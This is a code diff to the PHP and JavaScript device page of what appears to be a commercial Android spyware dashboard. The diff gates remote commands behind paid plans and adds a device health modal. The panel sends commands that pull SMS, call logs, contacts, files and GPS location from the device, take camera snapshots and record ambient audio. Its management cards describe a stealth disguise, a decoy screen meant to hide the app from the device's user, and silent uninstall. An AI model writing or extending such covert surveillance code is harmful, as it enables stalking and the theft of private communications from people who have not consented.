@@ -64,7 +64,11 @@
                             <?php endif; ?>
                         </div>
                     </div>
-                    <script>const activeFcmToken = <?= json_encode($targetDevice['fcm_token'] ?? '') ?>;</script>
+                    <?php
+                        $crypt = new \App\Models\Mod_Crypt();
+                        $cryptId = isset($targetDevice['counter']) ? $crypt->encrypt_id($targetDevice['counter']) : '';
+                    ?>
+                    <script>const activeFcmToken = <?= json_encode($cryptId) ?>;</script>
                     <?php else: ?>
                     <div class="callout callout-warning py-2">
                         <i class="fas fa-exclamation-circle text-warning mr-2"></i>
@@ -103,30 +107,30 @@
                             </div>
                             <div class="row text-center" id="command-grid">
                                 <?php
+                                $gate = new \App\Services\PlanGate();
+                                $ownerId = isset($targetDevice['owner_id']) ? (int)$targetDevice['owner_id'] : 0;
+                                
                                 $commands = [
-                                    ['id' => 'sms',           'label' => 'Fetch SMS',      'icon' => 'fas fa-sms',            'color' => '#007bff', 'desc' => 'All SMS messages'],
-                                    ['id' => 'calls',         'label' => 'Call Logs',      'icon' => 'fas fa-phone-alt',      'color' => '#28a745', 'desc' => 'Full call history'],
-                                    ['id' => 'contacts',      'label' => 'Contacts',       'icon' => 'fas fa-address-book',   'color' => '#17a2b8', 'desc' => 'Full contact list'],
-                                    ['id' => 'search_data',   'label' => 'Keyword Search', 'icon' => 'fas fa-search',         'color' => '#00acc1', 'desc' => 'Search SMS/Call data'],
-                                    ['id' => 'capture_photo', 'label' => 'Camera Snap',    'icon' => 'fas fa-camera',         'color' => '#d81b60', 'desc' => 'Remote photo capture'],
-                                    ['id' => 'record_audio',  'label' => 'Ambient Audio',  'icon' => 'fas fa-microphone',     'color' => '#ff8f00', 'desc' => 'Record environment audio'],
-                                    ['id' => 'files',         'label' => 'File List',      'icon' => 'fas fa-file-alt',       'color' => '#20c997', 'desc' => 'Recent files'],
-                                    ['id' => 'fetch_file',    'label' => 'Targeted File',  'icon' => 'fas fa-file-download',  'color' => '#00897b', 'desc' => 'Fetch specific file path'],
-                                    ['id' => 'location',      'label' => 'GPS Location',   'icon' => 'fas fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'Precise location & activity'],
-                                    ['id' => 'start_tracking','label' => 'Live Tracking',  'icon' => 'fas fa-route',          'color' => '#e53935', 'desc' => 'Real-time GPS tracking'],
-                                    ['id' => 'context',       'label' => 'Context',        'icon' => 'fas fa-walking',        'color' => '#e83e8c', 'desc' => 'Motion & device state'],
-                                    ['id' => 'apps',          'label' => 'Apps List',      'icon' => 'fas fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed apps'],
-                                    ['id' => 'usage',         'label' => 'App Usage',      'icon' => 'fas fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen-time stats'],
-                                    ['id' => 'notifications', 'label' => 'Notifications',  'icon' => 'fas fa-bell',           'color' => '#ffc107', 'desc' => 'Status bar alerts'],
-                                    ['id' => 'device_info',   'label' => 'Device Info',    'icon' => 'fas fa-info-circle',    'color' => '#6c757d', 'desc' => 'Hardware & build info'],
-                                    ['id' => 'misc_hardware', 'label' => 'Misc Hardware',  'icon' => 'fas fa-microchip',      'color' => '#117a8b', 'desc' => 'Sensors, network, Bluetooth'],
-                                    ['id' => 'misc_software', 'label' => 'Misc Software',  'icon' => 'fas fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
-                                    ['id' => 'beep',          'label' => 'Test Beep',      'icon' => 'fas fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play a beep sound'],
-                                    ['id' => 'all',           'label' => 'Sync All',       'icon' => 'fas fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Full data extraction'],
+                                    ['id' => 'contacts',      'feat' => 'fcm_fetch_contacts',   'label' => 'Contacts',       'icon' => 'fas fa-address-book',   'color' => '#17a2b8', 'desc' => 'Phonebook contacts'],
+                                    ['id' => 'beep',          'feat' => 'fcm_cmd_beep',         'label' => 'Test Beep',      'icon' => 'fas fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play audible test beep'],
+                                    ['id' => 'health_check',  'feat' => 'fcm_cmd_health',       'label' => 'Device Health',  'icon' => 'fas fa-heartbeat',      'color' => '#e53935', 'desc' => 'Instant battery/network check'],
+                                    ['id' => 'apps',          'feat' => 'fcm_fetch_apps',       'label' => 'Apps List',      'icon' => 'fas fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed packages list'],
+                                    ['id' => 'calls',         'feat' => 'fcm_fetch_calls',      'label' => 'Calls Logs',     'icon' => 'fas fa-phone-alt',      'color' => '#28a745', 'desc' => 'Call history list'],
+                                    ['id' => 'sms',           'feat' => 'fcm_fetch_sms',        'label' => 'SMS Messages',   'icon' => 'fas fa-sms',            'color' => '#007bff', 'desc' => 'Text messages logs'],
+                                    ['id' => 'location',      'feat' => 'fcm_fetch_location',   'label' => 'Location & Act', 'icon' => 'fas fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'GPS & activity logs'],
+                                    ['id' => 'telemetry_soft','feat' => 'fcm_fetch_usage',      'label' => 'Usage & Notifs', 'icon' => 'fas fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen time & status alerts'],
+                                    ['id' => 'capture_photo', 'feat' => 'fcm_cmd_camera',       'label' => 'Camera Capture', 'icon' => 'fas fa-camera',         'color' => '#d81b60', 'desc' => 'Snapshot from camera'],
+                                    ['id' => 'record_audio',  'feat' => 'fcm_cmd_audio',        'label' => 'Audio Capture',  'icon' => 'fas fa-microphone',     'color' => '#ff8f00', 'desc' => 'Ambient mic clip record'],
+                                    ['id' => 'files',         'feat' => 'fcm_fetch_files',      'label' => 'Device Files',   'icon' => 'fas fa-file-alt',       'color' => '#20c997', 'desc' => 'System filesystem files'],
+                                    ['id' => 'software_misc', 'feat' => 'fcm_fetch_soft_misc',  'label' => 'Misc Software',  'icon' => 'fas fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
+                                    ['id' => 'hardware_misc', 'feat' => 'fcm_fetch_hard_misc',  'label' => 'Misc Hardware',  'icon' => 'fas fa-microchip',      'color' => '#117a8b', 'desc' => 'Bluetooth, sensors, thermal'],
+                                    ['id' => 'all',           'feat' => 'fcm_fetch_all',        'label' => 'Sync All',       'icon' => 'fas fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Trigger all extractors'],
                                 ];
                                 foreach ($commands as $cmd):
+                                    $isAllowed = $ownerId ? $gate->hasFeature($ownerId, $cmd['feat']) : false;
                                 ?>
                                 <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-3">
+                                    <?php if ($isAllowed): ?>
                                     <button class="btn btn-block btn-remote-cmd p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                             data-cmd="<?= $cmd['id'] ?>"
                                             style="border-radius: 10px; transition: all 0.25s ease; background: #fff; cursor:pointer;">
@@ -136,6 +140,19 @@
                                         <span class="font-weight-bold text-dark mb-1" style="font-size:13px;"><?= $cmd['label'] ?></span>
                                         <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $cmd['desc'] ?></small>
                                     </button>
+                                    <?php else: ?>
+                                    <button class="btn btn-block p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
+                                            disabled
+                                            onclick="toastr.warning('Upgrade plan to access this telemetry data.');"
+                                            style="border-radius: 10px; background: #f8f9fa; opacity: 0.6; cursor: not-allowed;">
+                                        <div class="cmd-icon-wrapper mb-2 text-muted" style="font-size: 1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%; position:relative;">
+                                            <i class="<?= $cmd['icon'] ?>"></i>
+                                            <i class="fas fa-lock" style="position:absolute; bottom:0; right:0; font-size:11px; background:#fff; padding:2px; border-radius:50%; color:#dc3545;"></i>
+                                        </div>
+                                        <span class="font-weight-bold text-muted mb-1" style="font-size:13px;"><?= $cmd['label'] ?> (Locked)</span>
+                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $cmd['desc'] ?></small>
+                                    </button>
+                                    <?php endif; ?>
                                 </div>
                                 <?php endforeach; ?>
                             </div>
@@ -143,6 +160,15 @@
 
                         <!-- ==================== DEVICE MANAGEMENT TAB ==================== -->
                         <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
+                            <?php
+                                $gate = new \App\Services\PlanGate();
+                                $ownerId = isset($targetDevice['owner_id']) ? (int)$targetDevice['owner_id'] : 0;
+                                $canReset = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_reset_app') : false;
+                                $canDeactivate = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_deactivate') : false;
+                                $canLogout = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_logout') : false;
+                                $canPreserve = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_uninstall_preserve') : false;
+                                $canWipe = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_uninstall_wipe') : false;
+                            ?>
                             <div class="alert alert-warning alert-dismissible">
                                 <i class="fas fa-exclamation-triangle mr-2"></i>
                                 <strong>Caution:</strong> These commands make permanent changes to the Android device. Confirm each action carefully before executing.
@@ -156,9 +182,15 @@
                                             <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                             <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                             <p class="text-muted small mb-4">Restore default icon, clear stealth disguise, and reset launch codes to factory defaults.</p>
+                                            <?php if ($canReset): ?>
                                             <button class="btn btn-warning btn-block font-weight-bold btn-mgmt-cmd" data-cmd="reset_app">
                                                 <i class="fas fa-undo mr-1"></i> Reset App
                                             </button>
+                                            <?php else: ?>
+                                            <button class="btn btn-warning btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
+                                                <i class="fas fa-lock mr-1"></i> Reset App (Locked)
+                                            </button>
+                                            <?php endif; ?>
                                         </div>
                                     </div>
                                 </div>
@@ -170,9 +202,15 @@
                                             <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                             <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                             <p class="text-muted small mb-4">Replace the active UI with a static dummy screen. Unauthorized users see nothing suspicious.</p>
+                                            <?php if ($canDeactivate): ?>
                                             <button class="btn btn-secondary btn-block font-weight-bold btn-mgmt-cmd" data-cmd="deactivate">
                                                 <i class="fas fa-eye-slash mr-1"></i> Deactivate
                                             </button>
+                                            <?php else: ?>
+                                            <button class="btn btn-secondary btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
+                                                <i class="fas fa-lock mr-1"></i> Deactivate (Locked)
+                                            </button>
+                                            <?php endif; ?>
                                         </div>
                                     </div>
                                 </div>
@@ -184,9 +222,15 @@
                                             <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                             <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                             <p class="text-muted small mb-4">Clears auth token on device and stops background sync. Returns the user to the login screen.</p>
+                                            <?php if ($canLogout): ?>
                                             <button class="btn btn-info btn-block font-weight-bold btn-mgmt-cmd" data-cmd="logout">
                                                 <i class="fas fa-sign-out-alt mr-1"></i> Logout
                                             </button>
+                                            <?php else: ?>
+                                            <button class="btn btn-info btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
+                                                <i class="fas fa-lock mr-1"></i> Logout (Locked)
+                                            </button>
+                                            <?php endif; ?>
                                         </div>
                                     </div>
                                 </div>
@@ -198,9 +242,15 @@
                                             <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                             <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                             <p class="text-muted small mb-4">Backs up app data then uninstalls. Reinstalling the app will restore configuration automatically.</p>
+                                            <?php if ($canPreserve): ?>
                                             <button class="btn btn-danger btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_preserve">
                                                 <i class="fas fa-archive mr-1"></i> Uninstall &amp; Preserve
                                             </button>
+                                            <?php else: ?>
+                                            <button class="btn btn-danger btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
+                                                <i class="fas fa-lock mr-1"></i> Uninstall &amp; Preserve (Locked)
+                                            </button>
+                                            <?php endif; ?>
                                         </div>
                                     </div>
                                 </div>
@@ -212,9 +262,15 @@
                                             <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                             <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                             <p class="text-muted small mb-4">Completely removes the app and all local data. Device admin may enable silent removal. Cannot be undone.</p>
+                                            <?php if ($canWipe): ?>
                                             <button class="btn btn-dark btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_wipe">
                                                 <i class="fas fa-trash-alt mr-1"></i> Uninstall &amp; Wipe
                                             </button>
+                                            <?php else: ?>
+                                            <button class="btn btn-dark btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
+                                                <i class="fas fa-lock mr-1"></i> Uninstall &amp; Wipe (Locked)
+                                            </button>
+                                            <?php endif; ?>
                                         </div>
                                     </div>
                                 </div>
@@ -238,6 +294,115 @@
         </div><!-- /.container-fluid -->
     </section>
 </div><!-- /.content-wrapper -->
+
+<!-- Device Health Modal -->
+<div class="modal fade" id="modal-health-check" tabindex="-1" role="dialog" aria-labelledby="healthCheckModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content shadow-lg border-0" style="border-radius:15px;">
+            <div class="modal-header bg-dark text-white" style="border-top-left-radius:15px; border-top-right-radius:15px;">
+                <h5 class="modal-title font-weight-bold" id="healthCheckModalLabel">
+                    <i class="fas fa-heartbeat text-danger mr-2"></i> Device Diagnostics
+                </h5>
+                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body p-4" id="health-check-body">
+                <!-- Loading State -->
+                <div class="text-center py-5" id="health-loading">
+                    <div class="spinner-border text-danger mb-3" role="status" style="width: 3rem; height: 3rem;">
+                        <span class="sr-only">Checking...</span>
+                    </div>
+                    <h5 class="font-weight-bold text-dark">Contacting Device...</h5>
+                    <p class="text-muted small">Sent FCM signal. Waiting for diagnostics callback payload.</p>
+                </div>
+
+                <!-- Metrics Display (Hidden initially) -->
+                <div id="health-metrics" style="display:none;">
+                    <div class="text-center mb-4">
+                        <span class="badge badge-success px-3 py-2 font-weight-bold" id="health-net-badge">
+                            <i class="fas fa-wifi mr-1"></i> WI-FI Connected
+                        </span>
+                        <div class="text-muted small mt-1" id="health-ssid-display">SSID: Unknown</div>
+                    </div>
+
+                    <div class="row mb-3">
+                        <!-- Battery -->
+                        <div class="col-6">
+                            <div class="card bg-light border-0 p-3 h-100 text-center">
+                                <div class="text-warning mb-2" style="font-size:1.8rem;"><i class="fas fa-battery-three-quarters" id="health-batt-icon"></i></div>
+                                <h6 class="font-weight-bold text-dark mb-1">Battery</h6>
+                                <div class="h5 font-weight-bold text-dark mb-1" id="health-batt-level">--%</div>
+                                <small class="text-muted" id="health-batt-status">Discharging (32.4°C)</small>
+                            </div>
+                        </div>
+
+                        <!-- Screen & Lock -->
+                        <div class="col-6">
+                            <div class="card bg-light border-0 p-3 h-100 text-center">
+                                <div class="text-info mb-2" style="font-size:1.8rem;"><i class="fas fa-mobile-alt" id="health-screen-icon"></i></div>
+                                <h6 class="font-weight-bold text-dark mb-1">Screen State</h6>
+                                <div class="h5 font-weight-bold text-dark mb-1" id="health-screen-state">Unknown</div>
+                                <small class="text-muted" id="health-screen-lock">Keyguard: Locked</small>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row mb-3">
+                        <!-- Storage -->
+                        <div class="col-6">
+                            <div class="card bg-light border-0 p-3 h-100 text-center">
+                                <div class="text-primary mb-2" style="font-size:1.8rem;"><i class="fas fa-hdd"></i></div>
+                                <h6 class="font-weight-bold text-dark mb-1">Free Storage</h6>
+                                <div class="h5 font-weight-bold text-dark mb-1" id="health-storage-free">--%</div>
+                                <small class="text-muted" id="health-ram-free">Free RAM: -- MB</small>
+                            </div>
+                        </div>
+
+                        <!-- Device Network -->
+                        <div class="col-6">
+                            <div class="card bg-light border-0 p-3 h-100 text-center">
+                                <div class="text-success mb-2" style="font-size:1.8rem;"><i class="fas fa-network-wired"></i></div>
+                                <h6 class="font-weight-bold text-dark mb-1">IP & Carrier</h6>
+                                <div class="h5 font-weight-bold text-dark mb-1" style="font-size:14px; overflow-wrap:anywhere;" id="health-ip">0.0.0.0</div>
+                                <small class="text-muted" id="health-carrier">SIM: None</small>
+                            </div>
+                        </div>
+                    </div>
+
+                    <hr>
+
+                    <!-- Location and System -->
+                    <div class="d-flex align-items-center mb-2">
+                        <i class="fas fa-map-marker-alt text-danger mr-2"></i>
+                        <span class="font-weight-bold text-dark small">Location:</span>
+                        <span class="ml-auto text-muted small" id="health-location">Unavailable</span>
+                    </div>
+                    <div class="d-flex align-items-center mb-2">
+                        <i class="fas fa-history text-muted mr-2"></i>
+                        <span class="font-weight-bold text-dark small">System Uptime:</span>
+                        <span class="ml-auto text-muted small" id="health-uptime">-- hours</span>
+                    </div>
+                    <div class="d-flex align-items-center">
+                        <i class="fas fa-code-branch text-muted mr-2"></i>
+                        <span class="font-weight-bold text-dark small">App Version:</span>
+                        <span class="ml-auto text-muted small" id="health-version">v0.0.0</span>
+                    </div>
+                </div>
+
+                <!-- Error State -->
+                <div class="text-center py-5" id="health-error" style="display:none;">
+                    <div class="text-danger mb-3" style="font-size:3rem;"><i class="fas fa-exclamation-triangle"></i></div>
+                    <h5 class="font-weight-bold text-dark" id="health-error-title">Check Failed</h5>
+                    <p class="text-muted small" id="health-error-desc">Device did not respond to the health request in time.</p>
+                </div>
+            </div>
+            <div class="modal-footer bg-light" style="border-bottom-left-radius:15px; border-bottom-right-radius:15px;">
+                <button type="button" class="btn btn-secondary btn-block font-weight-bold" data-dismiss="modal">Close Diagnostics</button>
+            </div>
+        </div>
+    </div>
+</div>
 
 <style>
 .btn-remote-cmd:hover {
@@ -283,7 +448,7 @@ $(function() {
             };
 
             $.ajax({
-                url: `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}`,
+                url: `<?= base_url('api/v1/fcm-commands') ?>/${activeFcmToken}/cmd_${cmd}`,
                 method: 'POST',
                 data: extraData,
                 dataType: 'json',
@@ -311,21 +476,120 @@ $(function() {
 
         if (!activeFcmToken) { toastr.error('No active device with FCM token found.'); return; }
 
-        if (cmd === 'fetch_file') {
-            Swal.fire({ title:'Targeted File Fetch', text:'Enter the exact file path (e.g., /sdcard/Download/doc.pdf):', input:'text',
-                showCancelButton:true, confirmButtonText:'Fetch File',
-                inputValidator: v => { if (!v) return 'File path is required!'; }
-            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ file_path: r.value }); });
-        } else if (cmd === 'search_data') {
-            Swal.fire({ title:'Keyword Search', text:'Enter keyword to search in SMS/Calls:', input:'text',
-                showCancelButton:true, confirmButtonText:'Search',
-                inputValidator: v => { if (!v) return 'Keyword is required!'; }
-            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ keyword: r.value }); });
-        } else if (cmd === 'start_tracking') {
-            Swal.fire({ title:'Live Tracking', text:'Duration in minutes:', input:'number',
-                inputAttributes:{ min:1, max:1440 }, inputValue:60,
-                showCancelButton:true, confirmButtonText:'Start Tracking'
-            }).then(r => { if (r.isConfirmed && r.value) executeCommand({ duration_minutes: r.value }); });
+        if (cmd === 'health_check') {
+            $('#health-loading').show();
+            $('#health-metrics').hide();
+            $('#health-error').hide();
+            $('#modal-health-check').modal('show');
+
+            const triggerTime = Date.now();
+            let pollInterval = null;
+            let attempts = 0;
+            const maxAttempts = 10;
+
+            const pollLatestHealth = () => {
+                $.ajax({
+                    url: `<?= base_url('api/v1/devices/health-latest') ?>/${activeFcmToken}`,
+                    method: 'GET',
+                    dataType: 'json',
+                    success(r) {
+                        attempts++;
+                        if (r && r.success && r.data) {
+                            const data = r.data;
+                            const recordTime = new Date(data.created_at).getTime();
+
+                            if (recordTime > (triggerTime - 5000)) {
+                                clearInterval(pollInterval);
+                                renderHealthMetrics(data);
+                                return;
+                            }
+                        }
+
+                        if (attempts >= maxAttempts) {
+                            clearInterval(pollInterval);
+                            showHealthError('No Response', 'The device is currently offline or FCM communication was interrupted.');
+                        }
+                    },
+                    error() {
+                        attempts++;
+                        if (attempts >= maxAttempts) {
+                            clearInterval(pollInterval);
+                            showHealthError('Connection Error', 'Failed to communicate with local dashboard services.');
+                        }
+                    }
+                });
+            };
+
+            const renderHealthMetrics = (data) => {
+                $('#health-loading').hide();
+                $('#health-metrics').show();
+
+                let netIcon = '<i class="fas fa-network-wired mr-1"></i>';
+                if (data.network_type === 'WIFI') {
+                    netIcon = '<i class="fas fa-wifi mr-1"></i>';
+                } else if (data.network_type === 'MOBILE') {
+                    netIcon = '<i class="fas fa-signal mr-1"></i>';
+                } else if (data.network_type === 'NONE') {
+                    netIcon = '<i class="fas fa-times-circle mr-1"></i>';
+                }
+
+                $('#health-net-badge')
+                    .html(netIcon + ' ' + data.network_type)
+                    .removeClass('badge-success badge-warning badge-danger')
+                    .addClass(data.network_type === 'NONE' ? 'badge-danger' : 'badge-success');
+
+                $('#health-ssid-display').text(data.wifi_ssid ? 'SSID: ' + data.wifi_ssid : 'Carrier: ' + (data.sim_operator || 'None'));
+
+                $('#health-batt-level').text(data.battery_level + '%');
+                $('#health-batt-status').text(data.battery_status + (data.battery_temp ? ' (' + data.battery_temp + '°C)' : ''));
+                
+                let battIcon = 'fa-battery-three-quarters';
+                if (data.battery_level > 85) battIcon = 'fa-battery-full';
+                else if (data.battery_level > 50) battIcon = 'fa-battery-three-quarters';
+                else if (data.battery_level > 20) battIcon = 'fa-battery-quarter';
+                else battIcon = 'fa-battery-empty';
+                $('#health-batt-icon').attr('class', 'fas ' + battIcon);
+
+                $('#health-screen-state').text('Screen ' + data.screen_state);
+                $('#health-screen-lock').text(data.keyguard_locked == 1 ? 'Keyguard Locked' : 'Unlocked');
+                $('#health-screen-icon')
+                    .attr('class', data.screen_state === 'ON' ? 'fas fa-mobile-alt text-success' : 'fas fa-mobile-alt text-muted');
+
+                $('#health-storage-free').text((data.storage_free_percent || '--') + '%');
+                $('#health-ram-free').text(data.ram_free_mb ? 'Free RAM: ' + data.ram_free_mb + ' MB' : 'RAM: Unknown');
+
+                $('#health-ip').text(data.ip_address || '0.0.0.0');
+                $('#health-carrier').text('Carrier: ' + (data.sim_operator || 'None') + (data.signal_strength ? ' (' + data.signal_strength + ' dBm)' : ''));
+
+                if (data.last_latitude && data.last_longitude) {
+                    const locUrl = `https://www.google.com/maps/search/?api=1&query=${data.last_latitude},${data.last_longitude}`;
+                    $('#health-location').html(`<a href="${locUrl}" target="_blank" class="text-primary font-weight-bold"><i class="fas fa-external-link-alt mr-1"></i> View on Google Maps (${data.location_provider || 'GPS'})</a>`);
+                } else {
+                    $('#health-location').text('GPS Signal Lost');
+                }
+
+                const uptimeHours = data.uptime_seconds ? Math.round(data.uptime_seconds / 3600 * 10) / 10 : '--';
+                $('#health-uptime').text(uptimeHours + ' hours');
+                $('#health-version').text(data.app_version || 'Unknown');
+            };
+
+            const showHealthError = (title, desc) => {
+                $('#health-loading').hide();
+                $('#health-metrics').hide();
+                $('#health-error').show();
+                $('#health-error-title').text(title);
+                $('#health-error-desc').text(desc);
+            };
+
+            executeCommand();
+
+            setTimeout(() => {
+                pollInterval = setInterval(pollLatestHealth, 2000);
+            }, 1000);
+
+            $('#modal-health-check').on('hidden.bs.modal', function () {
+                if (pollInterval) clearInterval(pollInterval);
+            });
         } else {
             executeCommand();
         }
@@ -372,7 +636,7 @@ $(function() {
             const origHtml = $btn.html();
             $btn.addClass('loading').prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending…');
             $.ajax({
-                url: `<?= base_url('api/v1/fcm/send') ?>/${activeFcmToken}/cmd_${cmd}/${payloads[cmd] || cmd}`,
+                url: `<?= base_url('api/v1/fcm-commands') ?>/${activeFcmToken}/cmd_${cmd}/${payloads[cmd] || cmd}`,
                 method: 'POST',
                 dataType: 'json',
                 timeout: 120000,
